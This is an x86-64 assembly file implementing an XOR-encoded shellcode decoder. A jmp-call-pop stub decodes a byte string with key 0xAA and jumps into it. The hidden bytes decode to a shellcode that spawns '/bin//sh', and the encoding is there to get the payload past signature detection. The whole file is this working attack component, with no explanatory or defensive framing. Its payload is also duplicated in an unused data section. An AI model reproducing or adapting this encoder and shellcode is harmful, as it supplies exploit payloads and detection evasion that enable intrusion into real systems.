section .data
    payload db 0x9b, 0x5c, 0xfc, 0xe2, 0x11, 0x85, 0xc8, 0xc3, 0xc4, 0x85, 0x85, 0xd9, 0xc2, 0xf9, 0xfe, 0xf5, 0x5d, 0x44, 0x1a, 0x91, 0xa5, 0xaf
    payload_len equ $ - payload

section .text
global _start

_start:
    jmp short get_payload

decoder:
    pop rsi                 ; rsi now points to the encoded payload
    mov rcx, 0              ; zero rcx
    mov cl, payload_len     ; set rcx to the length of the payload

decode_loop:
    xor byte [rsi + rcx - 1], 0xAA  ; XOR each byte with 0xAA
    loop decode_loop         ; loop until rcx is zero

    ; Here we can add code to use the decoded payload the simple use case is just jump to it
    jmp rsi

exit:
    ; Exit the program
    mov eax, 60              ; syscall number for exit (60)
    xor edi, edi             ; exit code 0
    syscall

get_payload:
    call decoder
    db 0x9b, 0x5c, 0xfc, 0xe2, 0x11, 0x85, 0xc8, 0xc3, 0xc4, 0x85, 0x85, 0xd9, 0xc2, 0xf9, 0xfe, 0xf5, 0x5d, 0x44, 0x1a, 0x91, 0xa5, 0xaf
